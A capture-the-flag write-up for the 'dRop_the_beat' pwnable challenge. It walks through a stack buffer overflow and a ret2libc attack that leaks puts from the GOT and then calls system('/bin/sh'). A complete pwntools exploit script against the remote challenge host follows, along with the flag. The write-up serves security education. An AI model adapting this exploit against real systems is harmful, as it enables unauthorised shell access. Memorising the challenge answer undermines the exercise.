# dRop_the_beat

## Pwnable - Points: 1

> dRop the Beat DJ!!
>
> <br>
>
> <br>
>
> Author: Y311J(신재욱)
>
> <br>
>
> <br>
>
> <b>nc prob.vulnerable.kr 20002
>
> [drop_the_beat_easy](drop_the_beat_easy)
>
> [libc.so.6](libc.so.6)
>

The binary lets you read 300 bytes from `stdin` into 100 bytes buffer, so there is a buffer overflow. Lets check the enabled security mechanisms:

	$ checksec drop_the_beat_easy
	    Arch:     i386-32-little
    	RELRO:    Partial RELRO
    	Stack:    No canary found
    	NX:       NX enabled
    	PIE:      No PIE (0x8048000)

No canary found, so we get code execution, but NX is enabled, so we can not execute shellcode from the stack. The given `libc` already hints that we should `ret2libc`, but we have to leak the `libc` base address. We can jump to the function `puts` with the address of puts in `GOT` as argument to print the actual address of `puts` out and jump back to the beginning of the `main` function afterwards. Since it is 32 bit binary, the arguments are passed on the stack. With the leaked address and the given `libc` we can calculate the correct offsets of `puts` and `system` and the string `/bin/sh`.

In the second stage we can overflow the buffer to jump to the `system` function with the argument `/bin/sh` to spawn the shell and get the flag. 


Exploit script:

```python
from pwn import *

libc = ELF('libc.so.6')
e = ELF('drop_the_beat_easy')

# p = process('drop_the_beat_easy')
p = remote('prob.vulnerable.kr', 20002)

print p.recvuntil('2) No Beat For You..!\n')

p.sendline('1')
print p.recvuntil('Give Me a Beat!!\n')

p.sendline('A' * 100 + 'A' * 4 + p32(e.symbols['puts']) + p32(e.symbols['main']) + p32(e.got['puts']))
print p.recvuntil('AWESOME!\n')

puts = u32(p.recv(4))
print hex(puts)

libc_base = puts - libc.symbols['puts']
print 'libc_base: ' + hex(libc_base)
system = libc_base + libc.symbols['system']
sh = libc_base + libc.search("/bin/sh").next()

print p.recvuntil('2) No Beat For You..!\n')

p.sendline('1')
print p.recvuntil('Give Me a Beat!!\n')

p.sendline('A' * 100 + 'A' * 4 + p32(system) + 'A' * 4 + p32(sh))

p.interactive()
```

flag: `KorNewbie{R0PR0PR@P~@!#GrE4T_3EaT_!ROPROPROP*@(#}`